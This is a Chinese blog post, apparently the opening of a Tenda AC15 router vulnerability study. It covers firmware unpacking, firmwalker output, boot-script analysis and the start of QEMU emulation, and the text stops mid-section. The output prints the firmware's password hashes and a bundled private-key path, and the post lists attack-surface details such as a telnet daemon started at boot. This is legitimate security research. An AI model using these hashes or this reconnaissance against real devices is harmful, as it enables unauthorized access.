  
  
  <entry>
    <title>qemu固件模拟网卡分析---我与br0的爱恨情仇</title>
    <link href="/2024/07/24/qemu%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E7%BD%91%E5%8D%A1%E5%88%86%E6%9E%90-%E6%88%91%E4%B8%8Ebr0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/"/>
    <url>/2024/07/24/qemu%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E7%BD%91%E5%8D%A1%E5%88%86%E6%9E%90-%E6%88%91%E4%B8%8Ebr0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/</url>
    
    <content type="html"><![CDATA[<h2 id="qemu固件模拟网卡分析—我与br0的爱恨情仇"><a href="#qemu固件模拟网卡分析—我与br0的爱恨情仇" class="headerlink" title="qemu固件模拟网卡分析—我与br0的爱恨情仇"></a>qemu固件模拟网卡分析—我与br0的爱恨情仇</h2><p>固件包名：tenda US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin</p><ul><li>型号：AC15</li><li>版本：V1.0BR_V15.03.05.19</li><li>官网：<a href="https://www.tenda.com/">https://www.tenda.com/</a></li><li>测试环境：Ubuntu 18.04</li></ul><p>binwalk -Me 解包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240801214147191.png" alt="image-20240801214147191"></p><p>firmwalker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br></pre></td><td class="code"><pre><code class="hljs shell">***Firmware Directory***<br>/home/iot/gujian/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root<br>***Search for password files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### passwd</span></span><br>t/etc_ro/passwd<br>t/usr/bin/passwd<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### shadow</span></span><br>t/etc_ro/shadow<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.psk</span></span><br><br>***Search for Unix-MD5 hashes***<br>/home/iot/gujian/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root/etc_ro/passwd:$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1<br>/home/iot/gujian/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root/etc_ro/shadow:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1<br><br><br>***Search for SSL related files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.crt</span></span><br>t/webroot_ro/pem/certSrv.crt<br>Shodan cli not found.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.pem</span></span><br>t/webroot_ro/pem/privkeySrv.pem<br><br><br>***Search for files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.conf</span></span><br>t/etc_ro/ld.so.conf<br>t/etc_ro/nginx/conf/nginx.conf<br>t/etc_ro/nginx/conf/fastcgi.conf<br>t/etc_ro/mdev.conf<br>t/etc_ro/smb.conf<br>t/etc_ro/minidlna.conf<br>t/etc_ro/vsftpd.conf<br>t/etc_ro/udev/udev.conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.cfg</span></span><br>t/etc_ro/fireversion.cfg<br>t/etc_ro/features.cfg<br>t/etc_ro/policy_bak.cfg<br>t/webroot_ro/nvram_default.cfg<br>t/webroot_ro/default.cfg<br>t/webroot_ro/default_url.cfg<br><br>***Search for shell scripts***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### shell scripts</span></span><br>t/etc_ro/nginx/conf/nginx_init.sh<br>t/etc_ro/wds.sh<br>t/usr/sbin/Printer.sh<br>t/usr/sbin/usb_up.sh<br>t/usr/sbin/usb_down.sh<br>t/bin/iprule.sh<br>t/bin/pptpc.sh<br>t/bin/pptpd244.sh<br>t/bin/pptpd.sh<br>t/bin/pppoeconfig.sh<br>t/bin/pptpc244.sh<br><br>***Search for other .bin files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### bin files</span></span><br><br>***Search for patterns in files***<br>-------------------- upgrade --------------------<br>t/etc_ro/features.cfg<br>t/etc_ro/policy_bak.cfg<br>t/usr/sbin/smbd<br>t/usr/sbin/wl<br>t/bin/cfmd<br>t/bin/httpd<br>t/bin/business_proc<br>t/webroot_ro/wifi_ap.html<br>t/webroot_ro/js/libs/public.js<br>t/webroot_ro/js/directupgrade.js<br>t/webroot_ro/js/main.js<br>t/webroot_ro/css/reasy-ui.css<br>t/webroot_ro/redirect.html<br>t/webroot_ro/directupgrade.html<br>t/webroot_ro/lang/zh/translate.json<br>t/webroot_ro/lang/cn/translate.json<br>t/webroot_ro/system_upgrade.html<br>t/webroot_ro/simple_upgrade.asp<br>t/webroot_ro/main.html<br>t/lib/libntfs-3g.so.81<br>t/lib/libcloud.so<br>t/lib/libtpi.so<br><br>-------------------- admin --------------------<br>t/etc_ro/passwd<br>t/etc_ro/smb.conf<br>t/usr/sbin/xtables-multi<br>t/usr/sbin/smbd<br>t/bin/pptpctrl<br>t/bin/dhttpd<br>t/bin/vsftpd<br>t/bin/httpd<br>t/bin/netctrl<br>t/bin/business_proc<br>t/webroot_ro/login.html<br>t/webroot_ro/samba.html<br>t/webroot_ro/default.cfg<br>t/webroot_ro/js/samba.js<br>t/webroot_ro/lang/zh/translate.json<br>t/webroot_ro/lang/cn/translate.json<br>t/webroot_ro/index.html<br>t/lib/libshared.so<br>t/lib/libtpi.so<br><br>-------------------- root --------------------<br>t/etc_ro/passwd<br>t/etc_ro/nginx/conf/nginx.conf<br>t/etc_ro/group<br>t/etc_ro/shadow<br>t/etc_ro/vsftpd.conf<br>t/usr/bin/spawn-fcgi<br>t/usr/bin/nginx<br>t/usr/local/ssl/openssl.cnf<br>t/usr/sbin/brctl<br>t/usr/sbin/dnsmasq<br>t/usr/sbin/smbd<br>t/usr/lib/libip6tc.so.0.0.0<br>t/usr/lib/libnetconf.so<br>t/usr/lib/libip4tc.so.0.0.0<br>t/bin/wps_monitor<br>t/bin/miniupnpd<br>t/bin/busybox<br>t/bin/pppd<br>t/bin/chkntfs<br>t/bin/dhcps<br>t/bin/inadyn<br>t/bin/minidlna<br>t/bin/multiWAN<br>t/bin/vsftpd<br>t/bin/igmpproxy<br>t/bin/dnrd<br>t/bin/ip<br>t/bin/dosfsck<br>t/bin/netctrl<br>t/bin/business_proc<br>t/webroot_ro/js/libs/j.js<br>t/webroot_ro/js/libs/reasy-ui-1.0.3.js<br>t/sbin/udevd<br>t/lib/libsqlite3.so.0<br>t/lib/modules/2.6.36.4brcmarm/kernel/drivers/usb/core/usbcore.ko<br>t/lib/modules/2.6.36.4brcmarm/kernel/drivers/usb/host/xhci-hcd.ko<br>t/lib/modules/fastnat.ko<br>t/lib/modules/ufsd.ko<br>t/lib/modules/loadbalance.ko<br>t/lib/libntfs-3g.so.81<br>t/lib/rp-pppoe.so<br>t/lib/libcrypto.so.1.0.0<br><br>-------------------- password --------------------<br>t/etc_ro/HP_P1008.img<br>t/etc_ro/features.cfg<br>t/etc_ro/policy_bak.cfg<br>t/usr/bin/app_data_center<br>t/usr/local/ssl/openssl.cnf<br>t/usr/sbin/pppoecd<br>t/usr/sbin/smbd<br>t/usr/sbin/smbpasswd<br>t/bin/busybox<br>t/bin/pppd<br>t/bin/inadyn<br>t/bin/pppoeconfig.sh<br>t/bin/3322ip<br>t/bin/dhttpd<br>t/bin/xl2tpd<br>t/bin/vsftpd<br>t/bin/httpd<br>t/bin/business_proc<br>t/bin/88ip<br>t/webroot_ro/remote_web.html<br>t/webroot_ro/ddns_config.html<br>t/webroot_ro/net_set.html<br>t/webroot_ro/login.html<br>t/webroot_ro/samba.html<br>t/webroot_ro/wisp.html<br>t/webroot_ro/wireless_ssid.html<br>t/webroot_ro/js/system.js<br>t/webroot_ro/js/samba.js<br>t/webroot_ro/js/net_set.js<br>t/webroot_ro/js/login.js<br>t/webroot_ro/js/wireless_ssid.js<br>t/webroot_ro/js/pptp_server.js<br>t/webroot_ro/js/wisp.js<br>t/webroot_ro/js/libs/j.js<br>t/webroot_ro/js/libs/reasy-ui-1.0.3.js<br>t/webroot_ro/js/libs/public.js<br>t/webroot_ro/js/main.js<br>t/webroot_ro/js/index.js<br>t/webroot_ro/js/network-diagnose.js<br>t/webroot_ro/js/pptp_client.js<br>t/webroot_ro/cloud_managment.html<br>t/webroot_ro/css/test.css<br>t/webroot_ro/css/reasy-ui.css<br>t/webroot_ro/lang/zh/translate.json<br>t/webroot_ro/lang/cn/translate.json<br>t/webroot_ro/system_password.html<br>t/webroot_ro/pptp_client.html<br>t/webroot_ro/pptp_server.html<br>t/webroot_ro/index.html<br>t/webroot_ro/goform/GetSambaCfg.txt<br>t/webroot_ro/goform/GetPptpServerCfg.txt<br>t/webroot_ro/goform/getWanParameters.txt<br>t/webroot_ro/goform/cloud.txt<br>t/webroot_ro/goform/GetPptpClientCfg.txt<br>t/webroot_ro/main.html<br>t/lib/libc.so.0<br>t/lib/libpal_vendor.so<br>t/lib/libcloud.so<br>t/lib/libcrypto.so.1.0.0<br>t/lib/libtpi.so<br><br>-------------------- passwd --------------------<br>t/usr/sbin/pppoecd<br>t/usr/sbin/smbd<br>t/usr/sbin/smbpasswd<br>t/bin/busybox<br>t/bin/3322ip<br>t/bin/netctrl<br>t/sbin/udevd<br>t/lib/libc.so.0<br>t/lib/libcloud.so<br><br>-------------------- pwd --------------------<br>t/bin/busybox<br>t/bin/multiWAN<br>t/bin/cfmd<br>t/bin/vsftpd<br>t/bin/httpd<br>t/bin/netctrl<br>t/bin/business_proc<br>t/webroot_ro/system_automaintain.html<br>t/webroot_ro/samba.html<br>t/webroot_ro/default.cfg<br>t/webroot_ro/js/samba.js<br>t/webroot_ro/js/pptp_server.js<br>t/webroot_ro/js/libs/reasy-ui-1.0.3.js<br>t/webroot_ro/js/libs/public.js<br>t/webroot_ro/js/index.js<br>t/webroot_ro/cloud_managment.html<br>t/webroot_ro/css/reasy-ui.css<br>t/webroot_ro/dlna.html<br>t/webroot_ro/system_password.html<br>t/webroot_ro/index.html<br>t/sbin/udevd<br>t/lib/libc.so.0<br>t/lib/libpal_vendor.so<br>t/lib/libcloud.so<br>t/lib/libtpi.so<br><br>-------------------- ssl --------------------<br>t/etc_ro/features.cfg<br>t/etc_ro/policy_bak.cfg<br>t/etc_ro/nginx/conf/nginx.conf<br>t/usr/bin/nginx<br>t/usr/local/ssl/openssl.cnf<br>t/usr/sbin/smbd<br>t/bin/vsftpd<br>t/bin/httpd<br>t/lib/libcrypto.so.1.0.0<br><br>-------------------- private key --------------------<br>t/usr/local/ssl/openssl.cnf<br>t/bin/httpd<br>t/webroot_ro/pem/privkeySrv.pem<br>t/lib/libcrypto.so.1.0.0<br><br>-------------------- telnet --------------------<br>t/etc_ro/features.cfg<br>t/etc_ro/policy_bak.cfg<br>t/bin/busybox<br>t/bin/httpd<br>t/webroot_ro/js/virtual_server.js<br>t/lib/libcrypto.so.1.0.0<br><br>-------------------- secret --------------------<br>t/etc_ro/ppp/plugins/sync-pppd.so<br>t/etc_ro/ppp/plugins/cmd.so<br>t/usr/local/ssl/openssl.cnf<br>t/usr/sbin/smbd<br>t/bin/pppd<br>t/bin/l2tpd<br>t/bin/xl2tpd<br>-------------------- token --------------------<br>t/etc_ro/features.cfg<br>t/etc_ro/policy_bak.cfg<br>t/usr/sbin/smbd<br>t/usr/sbin/wl<br>t/bin/dhcpcd<br>t/bin/busybox<br>t/bin/pppd<br>t/bin/dhttpd<br>t/bin/xl2tpd<br>t/bin/igmpproxy<br>t/bin/httpd<br>t/lib/libsqlite3.so.0<br>t/lib/modules/ai.ko<br>t/lib/libcrypto.so.1.0.0<br>***Search for web servers***<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### httpd</span></span><br>t/bin/httpd<br><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802024739592.png" alt="image-20240802024739592"></p><p>架构：arm小段</p><p>NX保护开启，栈不可执行</p><p>服务为httpd启动，其接口的形式为<code>gofrom/</code>，根据文件结构，推测为goahead服务器</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240801223919883.png" alt="image-20240801223919883"></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs fortran">关于 GoAhead 和 HTTPD 的关系：<br><br>GoAhead 作为 HTTPD 的一种实现：<br><br>HTTPD （HyperText <span class="hljs-built_in">Transfer</span> Protocol Daemon）是一般用于指代 HTTP 服务器软件的术语。在广义上，任何实现了 HTTP 协议并能够处理 HTTP 请求的软件都可以称为 HTTPD。<br>GoAhead 实际上是一种 HTTPD 的具体实现，它以 C 语言编写，专注于嵌入式设备和嵌入式系统中提供 Web 服务的功能。<br>特点和用途：<br><br>轻量级和高效：GoAhead 被设计为小巧、高效的 Web 服务器，适用于嵌入式设备和其他资源受限的环境。<br>易于集成和定制：由于其轻量级和开放源代码的特性，开发人员可以相对容易地将 GoAhead 集成到他们的嵌入式系统中，并根据需要进行定制。<br>应用场景：<br><br>GoAhead 在嵌入式系统中广泛应用，例如网络路由器、工业控制系统、物联网设备等，这些设备需要提供 Web 界面或远程管理功能，但受限于资源需求而不能使用较为复杂的 Web 服务器软件。<br></code></pre></td></tr></table></figure><p>webroot目录为空，web文件在webroot_ro目录下</p><p>因此在一会儿的模拟中要注意web目录是否正确</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">rcS:<br>cp -rf /etc_ro/* /etc/<br>cp -rf /webroot_ro/* /webroot/<br></code></pre></td></tr></table></figure><h3 id="启动项分析"><a href="#启动项分析" class="headerlink" title="启动项分析"></a>启动项分析</h3><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240801220342914.png" alt="image-20240801220342914"></p><p>cat etc_ro&#x2F;init.d&#x2F;rcS</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>PATH=/sbin:/bin:/usr/sbin:/usr/bin/<br>export PATH<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">挂载ramfs到/var/</span><br>mount -t ramfs none /var/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建必要的目录</span><br>mkdir -p /var/etc<br>mkdir -p /var/media<br>mkdir -p /var/webroot<br>mkdir -p /var/etc/iproute<br>mkdir -p /var/run<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">从只读目录复制内容到可写目录</span><br>cp -rf /etc_ro/* /etc/<br>cp -rf /webroot_ro/* /webroot/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建额外的目录</span><br>mkdir -p /var/etc/upan<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">挂载/etc/fstab中指定的所有文件系统</span><br>mount -a<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">挂载devpts以支持伪终端</span><br>mount -t devpts devpts /dev/pts<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在/var/etc/upan上挂载tmpfs，并设置大小为2MB</span><br>mount -t tmpfs none /var/etc/upan -o size=2M<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动mdev以处理热插拔事件</span><br>mdev -s<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">再次创建必要的目录（重复的命令）</span><br>mkdir /var/run<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置热插拔事件触发mdev</span><br>echo &#x27;/sbin/mdev&#x27; &gt; /proc/sys/kernel/hotplug<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置mdev规则以处理特定设备动作</span><br>echo &#x27;wds*.* 0:0 0660 */etc/wds.sh $ACTION $INTERFACE&#x27; &gt; /etc/mdev.conf<br>echo &#x27;sd[a-z][0-9] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH&#x27; &gt;&gt; /etc/mdev.conf<br>echo &#x27;-sd[a-z] 0:0 0660 $/usr/sbin/usb_down.sh $MDEV $DEVPATH&#x27; &gt;&gt; /etc/mdev.conf<br>echo &#x27;sd[a-z] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH&#x27; &gt;&gt; /etc/mdev.conf<br>echo &#x27;.* 0:0 0660 */usr/sbin/IppPrint.sh $ACTION $INTERFACE&#x27; &gt;&gt; /etc/mdev.conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建ppp目录</span><br>mkdir -p /var/ppp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">加载内核模块</span><br>insmod /lib/modules/fastnat.ko <br>insmod /lib/modules/bm.ko<br>insmod /lib/modules/mac_filter.ko <br>insmod /lib/modules/privilege_ip.ko<br>insmod /lib/modules/qos.ko<br>insmod /lib/modules/url_filter.ko<br>insmod /lib/modules/loadbalance.ko<br>insmod /lib/modules/jnl.ko<br>insmod /lib/modules/ufsd.ko<br>insmod /lib/modules/fastnat_configure.ko<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">减少内核日志的冗余输出</span><br>echo &quot;0 0 0 0&quot; &gt; /proc/sys/kernel/printk<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动必要的服务</span><br>cfmd &amp;<br>echo &#x27;&#x27; &gt; /proc/sys/kernel/hotplug<br>udevd &amp;<br>logserver &amp;<br>tendaupload &amp;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">检查nginx_init.sh是否存在并执行</span><br>if [ -e /etc/nginx/conf/nginx_init.sh ]; then<br>    sh /etc/nginx/conf/nginx_init.sh<br>fi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动moniter服务</span><br>moniter &amp;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动telnet服务</span><br>telnetd &amp;<br></code></pre></td></tr></table></figure><p>奇怪的是并没有启动web服务的字段，猜测应该是在某个二进制文件里启动的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">启动必要的服务</span><br>cfmd &amp;<br>echo &#x27;&#x27; &gt; /proc/sys/kernel/hotplug<br>udevd &amp;<br>logserver &amp;<br>tendaupload &amp;<br></code></pre></td></tr></table></figure><p>把cfmd拽到ida，查找httpd字符串</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240801221616342.png" alt="image-20240801221616342"></p><p>这里发现创建了一个子进程来执行 <code>httpd</code> 命令，并将其标准输出重定向到 <code>/dev/console</code></p><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><h4 id="用户模拟"><a href="#用户模拟" class="headerlink" title="用户模拟"></a>用户模拟</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">用户级模拟是 QEMU 的一种轻量级仿真模式，通常用于运行与主机架构不同的用户空间程序，而不需要完全模拟整个操作系统或硬件平台。<br></code></pre></td></tr></table></figure><h5 id="Welcome-to问题"><a href="#Welcome-to问题" class="headerlink" title="Welcome to问题"></a>Welcome to问题</h5><figure 